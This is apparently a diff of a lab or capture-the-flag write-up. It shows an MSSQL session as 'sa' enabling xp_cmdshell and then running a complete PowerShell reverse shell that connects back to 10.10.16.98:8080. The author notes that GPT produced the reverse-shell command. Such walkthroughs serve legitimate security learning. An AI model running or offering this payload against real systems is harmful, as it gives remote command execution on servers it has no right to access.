@@ -300,9 +300,11 @@ ENVCHANGE(DATABASE): Old Value: master, New Value: msdb
 INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'msdb'.
 
 SQL (sa  dbo@msdb)> EXEC sp_configure 'show advanced options', 1;
+
 INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
 SQL (sa  dbo@msdb)> RECONFIGURE;
 SQL (sa  dbo@msdb)> EXEC sp_configure 'xp_cmdshell', 1;
+
 INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 SQL (sa  dbo@msdb)> RECONFIGURE;
 ```
@@ -342,7 +344,7 @@ Nice, I can ping my local machine. So now I can just get a reverse shell (`power
 ## Getting reverse `powershell` from the MSSQL 
 Attempting to get a reverse `powershell`
 ```powershell
-xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.16.79'',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
+SQL (sa  dbo@msdb)> exec xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.16.98'',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
 ```
 
 I simply ask GPT to write me the above command and voila! Below is what I get on my local machine.
